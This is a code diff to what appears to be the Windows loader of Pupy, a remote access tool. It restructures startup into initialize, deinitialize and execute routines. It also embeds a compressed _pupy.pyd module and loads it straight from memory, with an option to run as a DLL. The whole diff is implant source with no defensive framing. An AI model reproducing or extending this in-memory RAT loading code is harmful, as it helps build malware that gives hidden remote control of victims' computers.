@@ -11,8 +11,15 @@
 
 #include "Python-dynload.c"
 
-extern DL_EXPORT(void) init_memimporter(void);
-extern DL_EXPORT(void) init_pupy(void);
+#ifdef _PUPY_DYNLOAD
+#ifdef DEBUG
+#include "_pupy_debug_pyd.c"
+#define _pupy_pyd_c_start _pupy_debug_pyd_c_start
+#define _pupy_pyd_c_size _pupy_debug_pyd_c_size
+#else
+#include "_pupy_pyd.c"
+#endif
+#endif
 
 typedef LPWSTR* (*CommandLineToArgvW_t)(
     LPCWSTR lpCmdLine,
@@ -22,6 +29,7 @@ typedef LPWSTR* (*CommandLineToArgvW_t)(
 
 #ifdef DEBUG
 // Redirect early stdout to some file
+static
 void redirect_stdout() {
     FILE* new_log;
     char tmpdir[MAX_PATH];
@@ -47,6 +55,7 @@ void redirect_stdout() {
 
 
 // https://stackoverflow.com/questions/291424/
+static
 LPSTR* CommandLineToArgvA(INT *pNumArgs)
 {
     LPWSTR cmdline;
@@ -150,21 +159,19 @@ LPSTR* CommandLineToArgvA(INT *pNumArgs)
     return result;
 }
 
-DWORD WINAPI mainThread(LPVOID lpArg)
-{
+void initialize(BOOL isDll, on_exit_session_t *cb) {
     int i, argc = 0;
     char **argv = NULL;
+
+#ifdef _PUPY_DYNLOAD
+    _pupy_pyd_args_t args;
+#endif
 
     dprint("TEMPLATE REV: %s\n", GIT_REVISION_HEAD);
 
 #ifdef DEBUG
     redirect_stdout();
 #endif
-
-    dprint("Initializing python...\n");
-    if (!initialize_python()) {
-        return -1;
-    }
 
     dprint("Parsing command line..\n");
     argv = CommandLineToArgvA(&argc);
@@ -173,11 +180,55 @@ DWORD WINAPI mainThread(LPVOID lpArg)
         dprint("ARGV: %d: %s\n", i, argv[i]);
     }
 
+    dprint("Initializing python...\n");
+    if (!initialize_python(argc, argv, isDll)) {
+        return -1;
+    }
+
+#ifdef _PUPY_DYNLOAD
+    dprint("_pupy built with dynload\n");
+
+    args.pvMemoryLibraries = MyGetLibraries();
+    args.cbExit = NULL;
+    args.blInitialized = FALSE;
+
+    dprint("Load _pupy\n");
+    xz_dynload(
+        "_pupy.pyd",
+        _pupy_pyd_c_start, _pupy_pyd_c_size,
+        &args
+    );
+
+    if (args.blInitialized != TRUE) {
+        dprint("_pupy.pyd initialization failed\n");
+        return -1;
+    }
+
+    dprint("cbExit: %p\n", args.cbExit);
+    dprint("pvMemoryLibraries: %p\n", args.pvMemoryLibraries);
+
+    if (cb) {
+        *cb = args.cbExit;
+    }
+#else
+    init_pupy();
+    if (cb) {
+        *cb = on_exit_session;
+    }
+#endif
+
+    return 0;
+}
+
+void deinitialize() {
+    deinitialize_python();
+}
+
+DWORD WINAPI execute(LPVOID lpArg)
+{
     // no lpArg means shared object
-    dprint("Running pupy... (args=%d argv=%p)\n", argc, argv);
-    run_pupy(argc, argv, lpArg);
-
+    dprint("Running pupy...\n");
+    run_pupy();
     dprint("Global Exit\n");
-
     return 0;
 }
